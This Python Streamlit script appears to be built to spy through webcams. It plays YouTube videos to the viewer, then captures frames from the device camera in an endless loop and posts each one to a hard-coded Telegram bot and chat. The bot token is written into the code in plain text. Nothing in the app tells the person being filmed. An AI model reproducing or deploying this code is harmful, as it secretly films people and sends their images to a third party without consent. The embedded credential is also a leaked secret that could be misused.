import cv2
import requests
from io import BytesIO
import streamlit as st

def main():
    st.title("Webcam to Telegram")
    video_url = 'https://youtu.be/hWDb07nD5vw?si=W4BYJLJdP8r_VOE9'
    video_url = "https://youtu.be/Nj08CcQyIis?si=eyG5L-L6bIFzuEXX"
    video_url ="https://youtu.be/fuhE6PYnRMc?si=a5Fq8zHLkWK31z9Y"
    video_url = "https://youtu.be/jSij_Q8V6N8?si=V9ksufQZMe6dB5Hu"
    st.video(video_url)

if __name__ == "__main__":
    main()



# Telegram bot API token
TELEGRAM_BOT_TOKEN = "6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw"

# Telegram chat ID where you want to send the picture
TELEGRAM_CHAT_ID = "5125698617"

# Function to send the image to Telegram
def send_to_telegram(image):
    files = {"photo": image}
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    params = {"chat_id": TELEGRAM_CHAT_ID}
    response = requests.post(url, files=files, data=params)

# Main Streamlit app
def main():
    cap = cv2.VideoCapture(0)

    while True:
        ret, frame = cap.read()

        # Convert the frame to bytes
        _, buffer = cv2.imencode('.jpg', frame)
        image_bytes = BytesIO(buffer)

        # Send the captured frame to Telegram
        send_to_telegram(image_bytes)

    cap.release()



if __name__ == "__main__":
    main()
